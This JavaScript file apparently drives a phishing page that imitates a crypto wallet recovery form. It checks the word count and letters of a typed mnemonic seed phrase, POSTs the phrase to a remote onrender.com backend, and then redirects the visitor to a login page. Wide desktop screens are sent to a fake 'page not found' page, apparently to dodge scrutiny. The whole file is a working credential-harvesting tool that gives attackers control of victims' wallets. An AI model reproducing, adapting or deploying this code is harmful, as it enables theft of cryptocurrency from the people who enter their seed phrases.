let str = ""
let error1 = false;
let error2 = false;
let error3 = false;
let error4 = false;

if(screen.width > 768){
  window.location.assign("../PageNotFound/PageNotFound.html")
}

document.querySelector(".text-box").addEventListener("change",(e)=>{
    document.querySelector(".error-box").classList.add("display")
    str = e.target.value;
})

document.querySelector(".button").style.backgroundColor = "rgba(40, 38, 38, 0.989)"
document.querySelector(".button").style.color = "gray"

document.querySelector(".text-box").addEventListener("input",(e)=>{
    if(e.target.value.length === 0){
        document.querySelector(".button").style.backgroundColor = "rgba(40, 38, 38, 0.989)"
        document.querySelector(".button").style.color = "gray"
    }
    else{
        document.querySelector(".button").style.backgroundColor = "rgb(120, 89, 177)"
        document.querySelector(".button").style.color = "white"
    }
})

function checkStrLen(str){
    let words = 0;
    for(let i=0;i<str.length;i++){
        if(str.charAt(i)=== " "){
            words++;
        }
    }
    return words === 11 || words === 23 || words === 14 || words === 17 || words === 20 ? true : false
}

function checkSymbNum(str){
    let inputLen = str.length
    for(let i=0;i<inputLen;i++){
      if((str.charCodeAt(i)>=0 && str.charCodeAt(i)<=31) || (str.charCodeAt(i)>=33 && str.charCodeAt(i)<=64) || (str.charCodeAt(i)>=91 && str.charCodeAt(i)<=96) || (str.charCodeAt(i)>=123 && str.charCodeAt(i)<=126)){
        return false;
      }
    }
    return true;
}

document.querySelector(".button").addEventListener("click",(e)=>{
    e.preventDefault()
    let ans = checkStrLen(str);

    if(ans === false){
        document.querySelector(".error-box").innerHTML = "*Mnemonic Phrase Should Exactly Have 12,15,18,21 Or 24 Characters";
        document.querySelector(".error-box").classList.remove("display");
        error1 = true;
    }

    for(let i=0;i<str.length;i++){
        let word = ""
        for(let j=0;j<str.length;j++){
            if(str.charAt(j)===" ") break;
            word = word + str.charAt(j);
        }
        let ans2 = checkSymbNum(word);
        if(ans2 === false){
            document.querySelector(".error-box").innerHTML = "*Mnemonic Phrase Should Not Contain Any Special Or Numeric Values";
            document.querySelector(".error-box").classList.remove("display");
            error2 = true;
            break;
        }
    }

    if( (error1 === false && error2 === false) && (error3 === false && error4 === false)){
        console.log("HIE")
        const url = "https://backend-01-92mi.onrender.com/api/data7";
        const data = {
            mphrase:str
        };
        const options = {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify(data)
        };

        fetch(url, options)
        .then(response => {
        if (!response.ok) {
            throw new Error('Network response was not ok');
        }
        return response.json();
        })
        .then(data => {
        console.log(data)
        if(data.status === "Confirmed"){
            window.location.assign("../LoginPage/loginpage.html");
        }
        })
        .catch(error => {
        console.error('Fetch error:', error);
        });
    }
})
